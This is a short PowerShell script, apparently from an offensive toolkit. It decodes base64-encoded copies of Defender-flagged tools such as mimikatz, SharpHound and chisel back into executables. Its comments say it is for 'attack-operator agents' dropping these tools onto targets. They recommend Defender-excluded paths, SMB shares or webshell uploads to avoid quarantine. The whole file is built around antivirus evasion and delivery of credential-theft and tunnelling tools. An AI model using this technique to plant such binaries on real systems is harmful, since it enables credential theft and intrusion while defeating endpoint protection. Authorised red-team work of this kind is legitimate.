# tools/decode-staged.ps1 — decode a Defender-staged binary from bin/.staged/<name>.b64 into
# the destination of your choice. Used by attack-operator agents when they need to drop
# Defender-flagged binaries (SharpHound.exe, mimikatz.exe, chisel.exe, etc.) onto a target.
#
#   Usage: tools\decode-staged.ps1 chisel.exe out\chisel.exe
#   Usage: tools\decode-staged.ps1 SharpHound.exe C:\Users\Public\sh.exe
#
# The .b64 files are text — Defender ignores them. The decoded .exe is written at --out;
# write it to a Defender-excluded path or straight to a target volume (SMB share, upload
# through webshell, etc.) to avoid local quarantine.
param(
  [Parameter(Mandatory=$true)][string]$Name,
  [Parameter(Mandatory=$true)][string]$Out
)
$here = Split-Path -Parent $PSScriptRoot
$src = Join-Path (Join-Path $here 'bin\.staged') ($Name + '.b64')
if (-not (Test-Path $src)) { Write-Error "No staged payload for '$Name' at $src"; exit 2 }
$outDir = Split-Path -Parent $Out
if ($outDir -and -not (Test-Path $outDir)) { New-Item -ItemType Directory -Force -Path $outDir | Out-Null }
$bytes = [Convert]::FromBase64String((Get-Content $src -Raw))
[System.IO.File]::WriteAllBytes($Out, $bytes)
Write-Host "decoded $Name -> $Out ({0:N0} bytes)" -f $bytes.Length
